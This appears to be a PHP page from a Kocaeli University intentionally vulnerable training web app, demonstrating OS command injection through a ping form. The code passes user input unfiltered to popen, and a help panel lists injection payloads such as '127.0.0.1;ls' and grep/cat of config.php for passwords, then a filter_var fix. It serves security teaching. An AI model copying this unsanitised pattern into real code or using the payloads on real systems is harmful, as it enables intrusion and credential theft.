<!DOCTYPE html>
<html>
<head>
        <meta charset="utf-8">
        <meta http-equiv="X-UA-Compatible" content="IE=edge">
        <title> Komut İnjection </title>
        <link rel="stylesheet" href="main.css"> 
        <link rel="stylesheet" href="bootstrap.min.css">
        <script src="jquery.min.js"></script>
        <script src="bootstrap.min.js"></script>
    </head>
    
 <nav class="navbar navbar-inverse">
  <div class="container-fluid">
    <div class="navbar-header">
      <a class="navbar-brand" href="index.html">Kocaeli Üniversitesi <br> Zayıf Web Uygulaması</a>
    </div>
    <ul class="nav navbar-nav active">

      <li><a href="kurulum.php">Kurulum</a></li>
      <li><a href="injectest.php">Sql Injection</a></li>
      <li><a href="xsstest.php">Xss</a></li>
      <li><a href="komutinjectest.php">Komut Injection</a></li>
    </ul>
    <ul class="nav navbar-nav navbar-right">
      <li><button type="button" class="btn btn-success navbar-btn" data-toggle="modal" data-target="#myModal">Yardım</button></li>
      <li><span>  </span> </li>
    </ul>
  </div>
  <p class="yesillik">&nbsp;</p>
</nav>
<hr>    
<div class="container-fluid">
  <div class="row content">
    <div class="col-sm-3 sidenav">
      <ul class="nav navbar-custom">
        <li class="active"><a href="index.html">Anasayfa</a></li>
        <li><a href="kurulum.php">Kurulum</a></li>
        <li class="bosluk">&nbsp;</li>  
        <li><a href="injectest.php">Sql Injection</a></li>
        <li><a href="xsstest.php">Xss</a></li>
        <li><a href="komutinjectest.php">Komut Injection</a></li>
          
      </ul><br>
   </div>

    <div class="col-sm-8">
        <div class="col-sm-9">
            <small><h3></h3></small>
            <label for="adres">Ping Atılacak Adres: </label>
            <form action="komutinjectest.php" method="GET" class="form-inline">
                <div class="form-group">
                    <input type="input" class="form-control" name="adres" placeholder="127.0.0.1" >
                </div>
                <button type="submit" value="click" name="submit" class="btn btn-default">Ping</button>

            </form>

            <?php

              function pingAt(){

                  $pingadresi = "ping -c 5 ". $_REQUEST["adres"];

                  //http://stackoverflow.com/questions/20107147/php-reading-shell-exec-live-output
                  while (@ob_end_flush()); 
                  $sonuc = popen($pingadresi, 'r');
                  //http://stackoverflow.com/questions/20107147/php-reading-shell-exec-live-output
                  echo '<pre>';
                  $i = 0;
                  while (!feof($sonuc)){
                    echo fread($sonuc, 4096);
                    @flush();
                    $i = $i + 1;
                  }
                  if($i<=1){
                    echo "ping atılamadı internet baglantinizi veya adresinizi kontrol edin";
                  }

                  echo '</pre>';

                  pclose($sonuc);
                  $sonuc = null;

              }


              if(isset($_GET['submit']) && !empty($_GET['adres']) ){
                  pingAt();
              }


            ?>

            <div class="modal fade" id="myModal" role="dialog">
                <div class="modal-dialog modal-lg">
                    
                    <div class="modal-content">
                        <div class="modal-header">
                            <button type="button" class="close" data-dismiss="modal">&times;</button>
                            
                            <h4 class="modal-title">Komut Injection Yardım</h4>
                        </div>
                        <div class="modal-body">
                            <h5><strong>Komut Enjeksiyonu</strong></h5>
                            <p>Kod Enjeksiyonu yetersiz filtrelemeden veya izinlerin doğru yapılandırılmamasından doğan bir güvenlik açığıdır. Saldırganın form verilerine kodlar ekleyerek yürütme sürecini değiştirmesine dayanır. Bilgi sızıntısına veya sistemin tamamen kontrolünün kaybedilmesine yol açabilir.</p>
                            <p>Bu sayfada ping işlemi kurgulanmıştır. Girilen adres değerine göre ping komutu işletilmektedir.</p>

                            <h5><strong>Zafiyet</strong></h5>
                            <div class="zafiyet">
                                <div class="code_alan_zafiyet">

                                    <p> <?php show_source("komutinkod.php"); ?> </p>
                                </div>
                                <p> Ping için adresin alındığı bölümden gelen veri herhangi bir filtreleme işlemi olmadan çalıştrılacak ping komutu ile birleştiriliyor bu yüzden saldırgan kendi kodunu noktalı virgül kullanarak eklerse ping komutulu ile kendi komutlarını da çalıştırabilir. </p>
                            
                            </div>

                            <h5><strong>Sömürü</strong></h5>
                            <div class="somuru">
                                <div class="code_alan">
                                    <p>link</p>
                                    <p><b>adım - 1 ls komutu:</b> localhost/komutinjectest.php?adres=127.0.0.1;ls&submit=click </p>
                                    <p>ya da  http://localhost/komutinjectest.php?adres=127.0.0.1%3B+ls&submit=click </p>

                                    <p><b>adım - 2 grep komutu:</b> localhost/komutinjectest.php?adres=127.0.0.1;+grep+"username"+config.php&submit=click </p>
                                    <p> <b>ya da:</b> http://localhost/komutinjectest.php?adres=127.0.0.1%3B+grep+%22username%22+config.php&submit=click </p>
                                    <p><b>ya da:</b> http://localhost/komutinjectest.php?adres=127.0.0.1%3B+grep+%22pass%22+config.php&submit=click</p>
                                    <p><b>ya da</b> http://localhost/komutinjectest.php?adres=127.0.0.1;cat%20config.php|%20grep%20%22a%22&submit=click</p>


                                    <p><b>ya da ping kutusuna: </b>  </p>
                                    <p>127.0.0.1; grep "username" config.php </p>
                                    <p>127.0.0.1; grep "pass" config.php </p>
                                
                                </div>
                                <p>Projede config.php dosyasında veritabanı bağlantıları yapılmıştır sömürü örneğinde önce ls komutu işlenerek dizinde bulunan dosyalara erişiliyor daha sonra saldırganın tahmin ettiği düşünülerek pass ve username gibi değerlerin grep komutu ile aranması ve bilgilerin elde edilmesi kurgulanmıştır</p>
                                <p>Örnek proje yapısının bozulmaması için bilgi çalıcı şekilde kurgulanmıştır ancak saldırgan sistemi tamamen ele geçirebilecek kodlar da ekleyebilir.</p>

                            </div>


                            <h5><strong>İyilestirme</strong></h5>
                            <div class="iyilestirme">
                                <div class="code_alan_zafiyet">
                                    <p> <?php show_source("cozumkomutin.php") ?> </p>
                                </div>
                                <p>Zafiyetin form verisine saldırganın kendi kodlarını eklemesi nedeniyle form verisinin php fonksiyonu olan filter_var ile url olup olmadığının kontrolünün yapılması sonucunda eğer saldırgan kendi komutlarını eklerse url olmadığı anlaşılır ve ping fonsiyonu kodları işletmeden biter. </p>
                            </div>


                        </div>
                        <div class="modal-footer">
                            <button type="button" class="btn btn-default" data-dismiss="modal">Kapat</button>
                        </div>
                    </div>
      
                </div>
            </div>
        </div>

    
    </div>
    </div>
    <hr>
 </div>   
    <footer class="navbar navbar-inverse">
      <div class="container-fluid">
          <div class="navbar-footer">
          <p>Kocaeli Üniversitesi Zayıf Web Uygulaması </p>
          </div>
      </div>
    </footer>
    
</html>
